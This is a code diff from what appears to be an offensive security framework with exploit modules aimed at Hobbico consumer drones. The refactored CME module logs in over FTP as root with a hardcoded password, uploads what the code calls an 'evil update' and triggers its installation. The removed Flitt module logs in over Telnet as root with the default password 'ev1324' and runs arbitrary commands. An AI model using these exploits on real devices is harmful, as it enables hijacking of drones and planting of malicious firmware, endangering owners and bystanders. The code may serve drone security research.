@@ -5,6 +5,7 @@ from datetime import datetime
 from sploitkit import *
 
 from . import DroneModule
+from ..generic import ftp
 from ..wifi import drone_filter
 
 
@@ -90,24 +91,12 @@ class CmeUpdateModule(CmeModule):
         ): 2121,
     })
     path = "exploit/hobbico/cme"
-    requirements = {'python': ["ftplib"]}
-
+    
+    @ftp("SYST", "PWD", "TYPE I", "CWD /", "PASV", username="root", password="*")
     def send_update(self, filename=None):
-        from ftplib import FTP
-        self.logger.info("Starting an FTP session...")
-        ftp = FTP(self.config.option("IP").value, self.config.option("FTP_PORT").value)
-        self.logger.debug("Authenticating...")
-        ftp.sendcmd("USER root")
-        ftp.sendcmd("PASS *")
-        ftp.sendcmd("SYST")
-        ftp.sendcmd("PWD")
-        ftp.sendcmd("TYPE I")
-        ftp.sendcmd("CWD /")
-        ftp.sendcmd("PASV")
         self.logger.info("Pushing an evil update...")
         with open(self.config.get("UPDATE_FILE"), 'rb') as f:
-            ftp.storbinary("STOR 0.7.15.zip", f)
-        ftp.quit()
+            self._ftp.storbinary("STOR 0.7.15.zip", f)
         self.logger.info("Triggering update...")
         success = s.send_command(71, '"0.7.15"')
         if success:
@@ -149,44 +138,4 @@ class FlittCommandModule(FlittModule):
         ): 10080,
     })
     path = "command/hobbico/flitt"
-
-
-class FlittTelnetModule(FlittModule):
-    """ Module proxy class holding the method for executing Telnet commands. """
-    config = Config({
-        Option(
-            'PASSWORD',
-            "Telnet password",
-            True,
-        ): "ev1324",
-    })
-    path = "exploit/hobbico/flitt"
-    requirements = {'python': ["telnetlib"]}
-    
-    def send_telnet_command(self, cmd):
-        from telnetlib import Telnet
-        self.logger.debug("Starting a Telnet session...")
-        t = Telnet(self.config.option("IP").value)
-        self.logger.debug("[SRV] " + t.read_until(b"login: ").decode("utf-8"))
-        self.logger.debug("[CLT] " + "root")
-        t.write(b"root\n")
-        self.logger.debug("[SRV] " + t.read_until(b"assword: ").decode("utf-8"))
-        pswd = self.config.option("PASSWORD").value
-        self.logger.debug("[CLT] " + pswd)
-        t.write(pswd.encode("utf-8") + b"\n")
-        resp = t.read_until(b"~ # ")
-        self.logger.debug("[SRV] " + resp.decode("utf-8"))
-        success = False
-        if b"Welcome to HiLinux." in resp:
-            self.logger.debug("[CLT] " + cmd)
-            t.write(cmd.encode("utf-8") + b"\n")
-            self.logger.success("Telnet command sent")
-            success = True
-            self.logger.debug("[CLT] exit")
-            t.write(b"exit\n")
-            t.read_all()
-        else:
-            self.logger.failure("Bad Telnet password")
-        t.close()
-        return success
 
